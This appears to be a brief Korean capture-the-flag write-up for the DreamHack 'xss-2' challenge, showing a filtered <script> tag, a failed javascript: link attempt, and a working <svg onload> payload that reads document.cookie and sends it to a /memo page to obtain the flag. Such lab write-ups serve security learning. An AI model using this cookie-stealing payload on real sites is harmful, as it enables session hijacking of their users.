#xss-2 풀이법

---

[ xss-1 풀이 ][1]

[1]: https://github.com/ckswls56/DreamHack/blob/main/Web%20Hacking/xss-1/ReadMe.md

xss-1처럼 시도하였지만 &lt;script&gt;가 필터링 되는듯 하였다. 즉 우회를 하여 풀어야 했다. <br>
참고문헌 <br>
https://blog.rubiya.kr/index.php/2019/03/28/browsers-xss-filter-bypass-cheat-sheet/

---

첫번쨰 시도<br>
&lt;a href="javascript:alert(1)">Link</a&gt; <br>
실패

---

두번쨰 시도
svg onload=alert(1) 성공 이후 폼 입력 페이지에서 다음을 입력하여 Flag 흭득<br>
&lt;svg onload='location.href="/memo?memo="+document.cookie'&gt;
